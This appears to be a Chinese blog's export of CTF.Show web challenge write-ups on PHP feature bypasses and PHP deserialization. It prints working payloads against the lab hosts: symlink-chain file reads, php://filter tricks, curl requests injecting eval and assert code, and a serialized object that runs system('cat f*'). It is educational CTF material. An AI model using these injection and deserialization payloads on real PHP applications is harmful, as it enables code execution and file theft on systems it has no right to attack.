<li><a href="https://www.cnblogs.com/wjrblogs/p/12285202.html">https://www.cnblogs.com/wjrblogs/p/12285202.html</a> CTF中常用的php伪协议利用</li>
<li><a href="https://www.php.net/manual/zh/wrappers.php.php">https://www.php.net/manual/zh/wrappers.php.php</a> php:// — 访问各个输入/输出流（I/O streams）</li>
<li><a href="https://www.php.net/manual/zh/filters.convert.php">https://www.php.net/manual/zh/filters.convert.php</a> 转换过滤器</li>
<li><a href="https://www.php.net/manual/zh/filters.php">https://www.php.net/manual/zh/filters.php</a> 可用过滤器列表</li>
<li><a href="https://www.php.net/manual/zh/wrappers.compression.php">https://www.php.net/manual/zh/wrappers.compression.php</a></li>
</ul>
<h1 id="web113"><a href="#web113" class="headerlink" title="web113"></a>web113</h1><p><code>PHP Version: 7.3.11</code></p>
<h2 id="知识点-3"><a href="#知识点-3" class="headerlink" title="知识点"></a>知识点</h2><ul>
<li>函数绕过</li>
<li>PHP 压缩流协议使用</li>
<li>多次软链接绕过 is_file()</li>
</ul>
<h2 id="做题-3"><a href="#做题-3" class="headerlink" title="做题"></a>做题</h2><h3 id="非预期解"><a href="#非预期解" class="headerlink" title="非预期解"></a>非预期解</h3><p>细节其实和上题差不多，只不过 filter 被限制使用了，还是可以用压缩流来绕过。</p>
<p>但我不明白，为什么不能用 zip:// 和 bzip2:// ，只能用 zlib2:// ?</p>
<blockquote>
<p>zlib: 的功能类似 gzopen()，但是 <strong>其数据流还能被 fread() 和其他文件系统函数使用</strong>。 不建议使用，因为会和其他带“:”字符的文件名混淆； 请使用 compress.zlib:// 替代。</p>
</blockquote>
<p><a href="https://www.php.net/manual/zh/wrappers.compression.php">zlib://</a></p>
<h3 id="预期解"><a href="#预期解" class="headerlink" title="预期解"></a>预期解</h3><p>经过20次软链接可以绕过 is_file()</p>
<p><code>/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php</code></p>
<p>原来还有 /proc/self/root 软链接这种方法，学到了</p>
<h1 id="web114"><a href="#web114" class="headerlink" title="web114"></a>web114</h1><p><code>PHP Version: 7.3.11</code></p>
<h2 id="知识点-4"><a href="#知识点-4" class="headerlink" title="知识点"></a>知识点</h2><ul>
<li>函数绕过</li>
<li>PHP 伪协议读取文件</li>
</ul>
<h2 id="做题-4"><a href="#做题-4" class="headerlink" title="做题"></a>做题</h2><p>这题拦截了 compress，拦截了convert，但又不拦截 filter 了，奇怪。</p>
<p><code>php://filter/resource=flag.php</code></p>
<h1 id="web115"><a href="#web115" class="headerlink" title="web115"></a>web115</h1><p><code>PHP Version: 7.3.11</code></p>
<h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: Firebasky</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-10-01 15:08:19</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$num</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$num</span>=str_replace(<span class="string">&quot;0x&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$num</span>=str_replace(<span class="string">&quot;0&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$num</span>=str_replace(<span class="string">&quot;.&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$num</span>=str_replace(<span class="string">&quot;e&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$num</span>=str_replace(<span class="string">&quot;+&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$num</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$num</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(is_numeric(<span class="variable">$num</span>) <span class="keyword">and</span> <span class="variable">$num</span>!==<span class="string">&#x27;36&#x27;</span> <span class="keyword">and</span> trim(<span class="variable">$num</span>)!==<span class="string">&#x27;36&#x27;</span> <span class="keyword">and</span> filter(<span class="variable">$num</span>)==<span class="string">&#x27;36&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>==<span class="string">&#x27;36&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;hacker!!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hacker!!!&quot;</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<h2 id="知识点-5"><a href="#知识点-5" class="headerlink" title="知识点"></a>知识点</h2><ul>
<li>通过 \f 绕过 is_numberic() 与 trim()</li>
</ul>
<h2 id="做题-5"><a href="#做题-5" class="headerlink" title="做题"></a>做题</h2><p>首先我们分析题目，此处将十六进制和八进制的方法给pass掉了，所以无法使用十六进制或八进制来直接绕过。其次，此处使用了 is_numeric 与 trim 来判断。is_numeric 用于判断是否为数字，通过 trim 过滤字符，trim 的语法见下</p>
<p><img data-src="CTF-Show-Get-Started-with-the-web-PHP-Feature-2/Untitled%201.png" alt="Untitled"></p>
<blockquote>
<p><strong>is_numeric函数在开始判断前，会先跳过所有空白字符。</strong>可是题目获取$req[‘number’]的时候明明使用trim过滤了空白字符这时候我们可以引入\f（也就是%0c）在数字前面，来绕过最后那个is_palindrome_number函数，而<strong>对于前面的数字判断，因为intval和is_numeric都会忽略这个字符，所以不会影响。</strong><br>————————————————<br>版权声明：本文为CSDN博主「EvilGenius-」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>原文链接：<a href="https://blog.csdn.net/qq_36609913/article/details/79296052">https://blog.csdn.net/qq_36609913/article/details/79296052</a></p>
</blockquote>
<p>所以，我们只需要在36前面添加 %0c 即 \f 的 urlencode 即可绕过，</p>
<h2 id="参考资料-2"><a href="#参考资料-2" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
<li><a href="https://blog.csdn.net/qq_44657899/article/details/109731923">https://blog.csdn.net/qq_44657899/article/details/109731923</a> ctfshow-web115（\f绕过is_numberic()+trim()）</li>
<li><a href="https://blog.csdn.net/qq_36609913/article/details/79296052">https://blog.csdn.net/qq_36609913/article/details/79296052</a> PHP代码审计(绕过过滤的空白字符)</li>
</ul>
<h1 id="web123"><a href="#web123" class="headerlink" title="web123"></a>web123</h1><p><code>PHP Version: 7.4.9</code></p>
<h2 id="做题-6"><a href="#做题-6" class="headerlink" title="做题"></a>做题</h2><p>思路错了。。我一开始在想怎么给 fl0g 赋值为 flag_give_me，但完全没有想到在eval可以直接echo一个$flag。。。</p>
<p>我们按照代码的判断条件来操作，结果最后发现 POST 上去的小数点 . 被转换为了下划线 _</p>
<p><img data-src="CTF-Show-Get-Started-with-the-web-PHP-Feature-2/Untitled%202.png" alt="Untitled"></p>
<p><a href="https://www.php.net/manual/zh/language.variables.external.php">PHP: 来自 PHP 之外的变量 - Manual</a></p>
<blockquote>
<p>注意:<br>变量名中的点和空格被转换成下划线。例如 <input name="a.b" /> 变成了 $_REQUEST[“a_b”]。</p>
</blockquote>
<p>那有什么办法呢？结果后来发现，原来[也会被转换，PHP会将 [ 转换为 . 这不刚好应了我的意吗？</p>
<p><a href="https://segmentfault.com/a/1190000019633304?sort=votes">PHP 对输入变量名的自动转换的问题与源码分析</a></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;input name=<span class="string">&quot;a.b&quot;</span> /&gt;        转为: <span class="variable">$_REQUEST</span>[<span class="string">&quot;a_b&quot;</span>]</span><br><span class="line">&lt;input name=<span class="string">&quot;a b&quot;</span> /&gt;        转为: <span class="variable">$_REQUEST</span>[<span class="string">&quot;a_b&quot;</span>]</span><br><span class="line">&lt;input name=<span class="string">&quot;a[b&quot;</span> /&gt;        转为: <span class="variable">$_REQUEST</span>[<span class="string">&quot;a_b&quot;</span>]</span><br><span class="line">&lt;input name=<span class="string">&quot;a]b&quot;</span> /&gt;        转为: <span class="variable">$_REQUEST</span>[<span class="string">&quot;a]b&quot;</span>]</span><br><span class="line">&lt;input name=<span class="string">&quot;a-b&quot;</span> /&gt;        转为: <span class="variable">$_REQUEST</span>[<span class="string">&quot;a-b&quot;</span>]</span><br><span class="line">&lt;input name=<span class="string">&quot; ab&quot;</span> /&gt;        转为: <span class="variable">$_REQUEST</span>[<span class="string">&quot;ab&quot;</span>]</span><br><span class="line">&lt;input name=<span class="string">&quot;ab &quot;</span> /&gt;        转为: <span class="variable">$_REQUEST</span>[<span class="string">&quot;ab &quot;</span>]</span><br><span class="line">&lt;input name=<span class="string">&quot;arr[a.b]&quot;</span> /&gt;   转为: <span class="variable">$_REQUEST</span>[<span class="string">&quot;arr&quot;</span>][<span class="string">&quot;a.b&quot;</span>]</span><br><span class="line">&lt;input name=<span class="string">&quot;ar.r[a.b]&quot;</span> /&gt;  转为: <span class="variable">$_REQUEST</span>[<span class="string">&quot;ar_r&quot;</span>][<span class="string">&quot;a.b&quot;</span>]</span><br><span class="line">&lt;input name=<span class="string">&quot;arr[a[b]]&quot;</span> /&gt;  转为: <span class="variable">$_REQUEST</span>[<span class="string">&quot;arr&quot;</span>][<span class="string">&quot;a[b&quot;</span>]</span><br><span class="line">&lt;input name=<span class="string">&quot;arr[a[]x]&quot;</span> /&gt;  转为: <span class="variable">$_REQUEST</span>[<span class="string">&quot;arr&quot;</span>][<span class="string">&quot;a[&quot;</span>]</span><br><span class="line">&lt;input name=<span class="string">&quot;arr[]ab&quot;</span> /&gt;    转为: <span class="variable">$_REQUEST</span>[<span class="string">&quot;arr&quot;</span>][<span class="number">0</span>]</span><br><span class="line">&lt;input name=<span class="string">&quot;arr[a]b&quot;</span> /&gt;    转为: <span class="variable">$_REQUEST</span>[<span class="string">&quot;arr&quot;</span>][<span class="string">&quot;a&quot;</span>]</span><br><span class="line">&lt;input name=<span class="string">&quot;arr[a.b&quot;</span> /&gt;    转为: <span class="variable">$_REQUEST</span>[<span class="string">&quot;arr_a.b&quot;</span>]</span><br><span class="line">&lt;input name=<span class="string">&quot;arr[[a.b&quot;</span> /&gt;   转为: <span class="variable">$_REQUEST</span>[<span class="string">&quot;arr_[a.b&quot;</span>]</span><br></pre></td></tr></table></figure>

<p>按照题目，第一个 [ 会被置换为下划线，之后的.就不会被转换，因此该题中 CTF_SHOW.COM 的参数应为 CTF[SHOW.COM</p>
<p>所以最后请求参数为</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">curl --location --request POST <span class="string">&#x27;http://ef9d0de2-60eb-49b4-a94d-58f30c185f81.challenge.ctf.show:8080/&#x27;</span> \</span><br><span class="line">								--form <span class="string">&#x27;CTF_SHOW=&quot;1&quot;&#x27;</span> \</span><br><span class="line">								--form <span class="string">&#x27;CTF[SHOW.COM=&quot;1&quot;&#x27;</span> \</span><br><span class="line">								--form <span class="string">&#x27;fl0g=&quot;1&quot;&#x27;</span> \</span><br><span class="line">								--form <span class="string">&#x27;fun=&quot;echo $flag&quot;&#x27;</span></span><br></pre></td></tr></table></figure>

<h2 id="参考资料-3"><a href="#参考资料-3" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
<li><a href="https://blog.csdn.net/weixin_45551083/article/details/110574834">https://blog.csdn.net/weixin_45551083/article/details/110574834</a> CTFShow web入门123-150 (php特性(二))</li>
<li><a href="https://www.freebuf.com/articles/web/261802.html">https://www.freebuf.com/articles/web/261802.html</a> php代码审计前奏之ctfshow之php特性</li>
<li><a href="https://www.php.net/manual/zh/language.variables.external.php">https://www.php.net/manual/zh/language.variables.external.php</a></li>
<li><a href="https://segmentfault.com/a/1190000019633304?sort=votes">https://segmentfault.com/a/1190000019633304?sort=votes</a></li>
</ul>
<h1 id="web125"><a href="#web125" class="headerlink" title="web125"></a>web125</h1><p><code>PHP Version: 7.4.9</code></p>
<h2 id="知识点-6"><a href="#知识点-6" class="headerlink" title="知识点"></a>知识点</h2><ul>
<li>在eval中调用函数，使用其他变量来绕过检查。</li>
</ul>
<h2 id="做题-7"><a href="#做题-7" class="headerlink" title="做题"></a>做题</h2><p>我们其实可以在eval的参数中再eval其他变量，例如这样： <code>eval($_GET[0])</code> ，然后再设置参数0为 <code>echo $flag;</code>，不就可以了嘛？</p>
<p>请求参数：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">curl --location --request POST <span class="string">&#x27;http://99fb334d-dd4f-40a2-8baf-f0f0015d457f.challenge.ctf.show:8080/?0=echo $flag;&#x27;</span> \</span><br><span class="line">								--form <span class="string">&#x27;CTF_SHOW=&quot;1&quot;&#x27;</span> \</span><br><span class="line">								--form <span class="string">&#x27;CTF[SHOW.COM=&quot;1&quot;&#x27;</span> \</span><br><span class="line">								--form <span class="string">&#x27;fl0g=&quot;1&quot;&#x27;</span> \</span><br><span class="line">								--form <span class="string">&#x27;fun=&quot;eval($_GET[0])&quot;&#x27;</span></span><br></pre></td></tr></table></figure>

<h1 id="web126"><a href="#web126" class="headerlink" title="web126"></a>web126</h1><h2 id="知识点-7"><a href="#知识点-7" class="headerlink" title="知识点"></a>知识点</h2><ul>
<li>使用 parse_str 将字符串解析成多个变量</li>
</ul>
<h2 id="做题-8"><a href="#做题-8" class="headerlink" title="做题"></a>做题</h2><p>草，前面没提到这个 <code>$a=$_SERVER[&#39;argv&#39;];</code> 我都忘了有这个东西了，还以为发挥作用的是 ?a=1+flag=xxx 这么厉害呢。。。</p>
<p>由题目，我们可以使用变量覆盖来使变量 $fl0g 的值为 flag_give_me ，但我们又不能直接传入 $_GET ，那怎么办呢？</p>
<p>刚好由 hint，我发现题目传入的参数是 /?a=1+fl0g=flag_give_me ，我还在好奇为什么不能用 &amp; 而需要用 + ，经过下面的分析就明白了。</p>
<p>使用 + 时，argv会被分成两个，分别为 <code>a=1</code> 以及 <code>fl0g=flag_give_me</code>，而此时 <code>$_GET</code> 只有一个数组成员。</p>
<p><img data-src="CTF-Show-Get-Started-with-the-web-PHP-Feature-2/Untitled%203.png" alt="Untitled"></p>
<p>但我使用 &amp; 时，argv还是回被分成2个，$_GET 此时就会变为两个，会被判断条件 <code>!isset($_GET[&#39;fl0g&#39;])</code> 所拦截。</p>
<h3 id="parse-str"><a href="#parse-str" class="headerlink" title="parse_str"></a>parse_str</h3><p>提交 fun 设置为 parse_str($a[1]) 即可获得flag，请求参数如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">curl --location --request POST <span class="string">&#x27;http://5f2c6d41-ccf6-48c6-a373-f554ec454ebd.challenge.ctf.show:8080/?a=1+fl0g=flag_give_me&#x27;</span> \</span><br><span class="line">								--form <span class="string">&#x27;CTF_SHOW=&quot;1&quot;&#x27;</span> \</span><br><span class="line">								--form <span class="string">&#x27;CTF[SHOW.COM=&quot;1&quot;&#x27;</span> \</span><br><span class="line">								--form <span class="string">&#x27;fl0g=&quot;1&quot;&#x27;</span> \</span><br><span class="line">								--form <span class="string">&#x27;fun=&quot;parse_str($a[1])&quot;&#x27;</span></span><br></pre></td></tr></table></figure>

<h3 id="assert"><a href="#assert" class="headerlink" title="assert"></a>assert</h3><p>这个函数的作用，有点类似于eval？但我就不明白了，<del>你小米把我内测资格取消掉，还把我的内测分把300多分扣到55分，你是傻的吗！</del></p>
<p><del>为什么eval不行？它碰撞到了哪个正则规则吗？</del></p>
<p><strong>在assert内允许不是分号结尾的语句，例如 assert(‘$a=test’);，但是eval内必须要为分号结尾，所以将assert改为eval时，还需要把 GET 参数 fl0g 中的flag_give_me 后面添加分号，这样就可以拿到flag了。</strong></p>
<p>请求参数如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">curl --location --request POST <span class="string">&#x27;http://5f2c6d41-ccf6-48c6-a373-f554ec454ebd.challenge.ctf.show:8080/?$fl0g=flag_give_me&#x27;</span> \</span><br><span class="line">								--form <span class="string">&#x27;CTF_SHOW=&quot;1&quot;&#x27;</span> \</span><br><span class="line">								--form <span class="string">&#x27;CTF[SHOW.COM=&quot;1&quot;&#x27;</span> \</span><br><span class="line">								--form <span class="string">&#x27;fl0g=&quot;1&quot;&#x27;</span> \</span><br><span class="line">								--form <span class="string">&#x27;fun=&quot;assert($a[0])&quot;&#x27;</span></span><br></pre></td></tr></table></figure>

<h2 id="参考资料-4"><a href="#参考资料-4" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
<li><a href="https://www.php.net/manual/zh/function.parse-str.php">https://www.php.net/manual/zh/function.parse-str.php</a> parse_str — 将字符串解析成多个变量</li>
<li><a href="https://www.php.net/manual/zh/function.assert.php">https://www.php.net/manual/zh/function.assert.php</a> assert — 检查一个断言是否为 false</li>
<li><a href="https://www.0x002.com/2018/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E5%8F%8A%E5%9C%A8webshell%E4%B8%AD%E7%9A%84%E8%BF%90%E7%94%A8/">https://www.0x002.com/2018/变量覆盖漏洞学习及在webshell中的运用/</a></li>
</ul>
<h1 id="web127"><a href="#web127" class="headerlink" title="web127"></a>web127</h1><p><code>PHP Version: 7.3.11</code></p>
<h2 id="做题-9"><a href="#做题-9" class="headerlink" title="做题"></a>做题</h2><p>这里面， $_SERVER[‘QUERY_STRING’] 会提取出请求 URL 中 /? 后的参数，也就是 GET 参数的 urlencode 版。但是，由于下划线被waf阻止，我们似乎不能直接使 ctf_show 的值为 ilove36d <del>（说起来这ctfshow的创始人是不是有什么特殊的xp天天喜欢36d的</del></p>
<p><del>上回书说道，彼时的璃月</del></p>
<p>我们在web123中提过，某些字符可以被转换。所以，参照该表，我们还可以用的字符为空格。</p>
<p>最后请求参数为</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">curl --location --request GET <span class="string">&#x27;http://08c6da10-0dd4-4d75-b0f7-8d3e70f950c6.challenge.ctf.show:8080/?ctf show=ilove36d&#x27;</span></span><br></pre></td></tr></table></figure>

<h1 id="web128"><a href="#web128" class="headerlink" title="web128"></a>web128</h1><p><code>PHP Version: 5.6.40</code></p>
<h2 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h2><figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*- </span></span><br><span class="line"><span class="comment"># @Author: h1xa </span></span><br><span class="line"><span class="comment"># @Date:   2020-10-10 11:25:09 </span></span><br><span class="line"><span class="comment"># @Last Modified by:   h1xa </span></span><br><span class="line"><span class="comment"># @Last Modified time: 2020-10-12 19:49:05 </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span> </span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>); </span><br><span class="line">include(<span class="string">&quot;flag.php&quot;</span>); </span><br><span class="line">highlight_file(__FILE__); </span><br><span class="line"></span><br><span class="line">$f1 = $_GET[<span class="string">&#x27;f1&#x27;</span>]; </span><br><span class="line">$f2 = $_GET[<span class="string">&#x27;f2&#x27;</span>]; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(check($f1))&#123; </span><br><span class="line">    var_dump(call_user_func(call_user_func($f1,$f2))); </span><br><span class="line">&#125;<span class="keyword">else</span>&#123; </span><br><span class="line">    echo <span class="string">&quot;嗯哼？&quot;</span>; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params">$str</span>)</span>&#123; </span><br><span class="line">    <span class="keyword">return</span> !preg_match(<span class="string">&#x27;/[0-9]|[a-z]/i&#x27;</span>, $str); </span><br><span class="line">&#125; NULL</span><br></pre></td></tr></table></figure>

<h2 id="知识点-8"><a href="#知识点-8" class="headerlink" title="知识点"></a>知识点</h2><ul>
<li>对 _() 函数的了解与使用</li>
</ul>
<h2 id="做题-10"><a href="#做题-10" class="headerlink" title="做题"></a>做题</h2><p>在 PHP 中，启用了 gettext 扩展的  PHP 程序上，直接调用 <em>() 方法等同于调用 gettext()，也就是说，调用 (“hello”); 会使 PHP 返回 hello 字符串。同时，在此题中使用 get_defined_text 可以获得被定义的变量。由于此处 check() 不允许变量 f1 携带任何字母和数字字符，所以只能从f2进行下手。</em></p>
<p>在此题中，也就等同于只能访问一个方法使得其获得flag。我们可以使用 <code>/?f1=_&amp;f2=get_defined_vars</code> 来获得 flag</p>
<h2 id="其他问题"><a href="#其他问题" class="headerlink" title="其他问题"></a>其他问题</h2><ul>
<li>有没有只通过一个函数来getshell的方法，比如说匿名函数？</li>
<li>有没有可以通过一个函数+一个参数，但是关键的控制函数（如eval，system等）被限制使用来getshell的方法？</li>
</ul>
<h2 id="参考资料-5"><a href="#参考资料-5" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://www.cnblogs.com/lost-1987/articles/3309693.html">toxic</a></p>
<p><a href="https://www.php.net/manual/zh/book.gettext.php">Gettext</a></p>
]]></content>
      <categories>
        <category>技术篇</category>
        <category>CTF</category>
      </categories>
  </entry>
  <entry>
    <title>【Klee-CTF】CTF.Show Web入门 PHP 反序列化 web254~web267</title>
    <url>/archives/CTF-Show-Get-Started-with-the-web-PHP-unserialize.html</url>
    <content><![CDATA[<h1 id="web254"><a href="#web254" class="headerlink" title="web254"></a>web254</h1><p><code>本题目基于 PHP7.3.11</code></p>
<h2 id="做法"><a href="#做法" class="headerlink" title="做法"></a>做法</h2><p>草，我一开始还以为username要用对象传进去，原来那个xxxxxx就是，那没事了。</p>
<p>直接访问 /?username=xxxxxx&amp;password=xxxxxx 即可</p>
<span id="more"></span>

<p><img data-src="CTF-Show-Get-Started-with-the-web-PHP-unserialize/Untitled.png" alt="CTF-Show-Get-Started-with-the-web-PHP-unserialize/Untitled.png"></p>
<h1 id="web255"><a href="#web255" class="headerlink" title="web255"></a>web255</h1><p><code>本题目基于 PHP7.3.11</code></p>
<h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><ul>
<li>PHP的对象序列化</li>
</ul>
<h2 id="做法-1"><a href="#做法-1" class="headerlink" title="做法"></a>做法</h2><p>设username为test，password为test，<del>注意php反序列化必须将对象内容全部设置完毕，不然不会成功反序列化。</del>好像也不是，回去再试试</p>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    public $username;</span><br><span class="line">    public $password;</span><br><span class="line">    public $isVip;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$ctf = <span class="keyword">new</span> ctfShowUser();</span><br><span class="line">$ctf-&gt;username = <span class="string">&quot;test&quot;</span>;</span><br><span class="line">$ctf-&gt;password = <span class="string">&quot;test&quot;</span>;</span><br><span class="line">$ctf-&gt;isVip = <span class="literal">true</span>;</span><br><span class="line">echo serialize($ctf);</span><br><span class="line"><span class="comment">// O:11:&quot;ctfShowUser&quot;:3:&#123;s:8:&quot;username&quot;;s:4:&quot;test&quot;;s:8:&quot;password&quot;;s:4:&quot;test&quot;;s:5:&quot;isVip&quot;;b:1;&#125;</span></span><br></pre></td></tr></table></figure>

<p>再注意丢去urlencode，得</p>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">O%3A11%3A%22ctfShowUser%<span class="number">22</span>%3A3%3A%7Bs%3A8%3A%22username%<span class="number">22</span>%3Bs%3A4%3A%22test%<span class="number">22</span>%3Bs%3A8%3A%22password%<span class="number">22</span>%3Bs%3A4%3A%22test%<span class="number">22</span>%3Bs%3A5%3A%22isVip%<span class="number">22</span>%3Bb%3A1%3B%7D</span><br></pre></td></tr></table></figure>

<p>放到header，Cookie: user=xxx</p>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">curl --location --request GET <span class="string">&#x27;http://55dfc84a-386d-4d27-aa29-872ad23e4c1b.challenge.ctf.show:8080/?username=test&amp;password=test&#x27;</span> \</span><br><span class="line">--header <span class="string">&#x27;Cookie: user=O%3A11%3A%22ctfShowUser%22%3A3%3A%7Bs%3A8%3A%22username%22%3Bs%3A4%3A%22test%22%3Bs%3A8%3A%22password%22%3Bs%3A4%3A%22test%22%3Bs%3A5%3A%22isVip%22%3Bb%3A1%3B%7D&#x27;</span></span><br></pre></td></tr></table></figure>

<p>your flag is ctfshow{106d93e8-fdba-4ce3-9ea2-6e9dd7e76250}</p>
<h1 id="web256"><a href="#web256" class="headerlink" title="web256"></a>web256</h1><h2 id="知识点-1"><a href="#知识点-1" class="headerlink" title="知识点"></a>知识点</h2><ul>
<li>细心的判断</li>
</ul>
<h2 id="做法-2"><a href="#做法-2" class="headerlink" title="做法"></a>做法</h2><p>麻痹的，这题还有个判断条件</p>
<p><img data-src="CTF-Show-Get-Started-with-the-web-PHP-unserialize/Untitled%201.png" alt="CTF-Show-Get-Started-with-the-web-PHP-unserialize/Untitled%201.png"></p>
<p>将上题中所设的password改为test1获得flag</p>
<h1 id="web257"><a href="#web257" class="headerlink" title="web257"></a>web257</h1><h2 id="知识点-2"><a href="#知识点-2" class="headerlink" title="知识点"></a>知识点</h2><ul>
<li>通过PHP序列化覆盖 ctfShowUser 中的 class 变量</li>
<li>间接修改 backDoor 中的 code 变量</li>
</ul>
<h2 id="做法-3"><a href="#做法-3" class="headerlink" title="做法"></a>做法</h2><p><a href="https://www.fatalerrors.org/a/ctfshow-deserialization.html">https://www.fatalerrors.org/a/ctfshow-deserialization.html</a></p>
<p>按照该网站上的做法，</p>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    private $class;</span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        $this-&gt;<span class="class"><span class="keyword">class</span></span>=<span class="keyword">new</span> backDoor();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">backDoor</span></span>&#123;</span><br><span class="line">    private $code=<span class="string">&#x27;system(&quot;cat f*&quot;);&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">$b=<span class="keyword">new</span> ctfShowUser();</span><br><span class="line">echo urlencode(serialize($b));</span><br></pre></td></tr></table></figure>

<p>但我无法复现，即使是改为这样</p>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    private $class = <span class="string">&#x27;backDoor&#x27;</span>; <span class="comment">// 修改class为backDoor方便调用</span></span><br><span class="line">    private $username=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    private $password=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    private $isVip=<span class="literal">true</span>; <span class="comment">// 改不改好像没所谓，这里题目没有判断</span></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        $this-&gt;<span class="class"><span class="keyword">class</span></span>=<span class="keyword">new</span> backDoor(); <span class="comment">// construct也要覆盖修改一下</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">backDoor</span></span>&#123;</span><br><span class="line">    private $code=<span class="string">&#x27;system(&quot;cat f*&quot;);&#x27;</span>; <span class="comment">// 提前设置好backDoor的code，关键时刻可以</span></span><br><span class="line">&#125;</span><br><span class="line">$b=<span class="keyword">new</span> ctfShowUser();</span><br><span class="line">echo urlencode(serialize($b));</span><br></pre></td></tr></table></figure>

<p>破案了，你妈将postman输出改成pretty就好了</p>
<p>（问题：这里construct函数也可以被覆盖吗？还是说因为construct将class给覆盖了？serialize会自动忽略construct函数吗？）</p>
<h1 id="web260"><a href="#web260" class="headerlink" title="web260"></a>web260</h1><h2 id="知识点-3"><a href="#知识点-3" class="headerlink" title="知识点"></a>知识点</h2><ul>
<li>PHP的序列化</li>
</ul>
